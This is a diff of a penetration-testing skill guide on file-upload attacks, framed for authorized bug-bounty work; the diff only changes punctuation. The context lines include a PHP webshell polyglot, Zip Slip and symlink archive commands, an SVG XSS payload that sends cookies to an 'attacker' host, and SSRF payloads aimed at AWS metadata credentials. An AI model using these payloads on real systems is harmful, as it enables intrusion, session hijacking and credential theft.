@@ -79,7 +79,7 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 ### ImageMagick SSRF / File Read (ImageTragick family + modern variants)
 ```bash
 # Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
-# MVG SSRF payload — fetches internal URL during processing
+# MVG SSRF payload: fetches internal URL during processing
 cat > /tmp/ssrf.mvg << 'EOF'
 push graphic-context
 viewbox 0 0 640 480
@@ -96,7 +96,7 @@ cat > /tmp/ssrf.svg << 'EOF'
 </svg>
 EOF
 
-# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
+# WebP/AVIF processing bugs (modern surface: CVE-2023-4863)
 # Upload a crafted WebP file targeting libwebp heap overflow
 # Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
 ```
@@ -155,11 +155,11 @@ curl -s -X POST "https://$TARGET/api/generate-pdf" \
 ## Archive Extraction Attacks (Zip Slip / Symlink)
 
 ```bash
-# Zip Slip — path traversal via archive filenames
+# Zip Slip: path traversal via archive filenames
 pip3 install evilarc
 python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip
 
-# Symlink attack — archive contains symlink to sensitive file
+# Symlink attack: archive contains symlink to sensitive file
 mkdir -p /tmp/sym_attack
 ln -s /etc/passwd /tmp/sym_attack/innocent.txt
 zip -ry /tmp/symlink.zip /tmp/sym_attack/
@@ -177,17 +177,17 @@ curl -s -X POST "https://$TARGET/api/import" \
 
 ## Related Skills & Chains
 
-- **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
-- **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
-- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
-- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
-- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
-- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.
+- **`hunt-rce`**; File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
+- **`hunt-xxe`**; Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP; every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
+- **`hunt-xss`**; SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
+- **`hunt-ssrf`**; Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
+- **`security-arsenal`**; Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
+- **`triage-validation`**; Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding; it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.
 
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
 
 ## Limitations
 
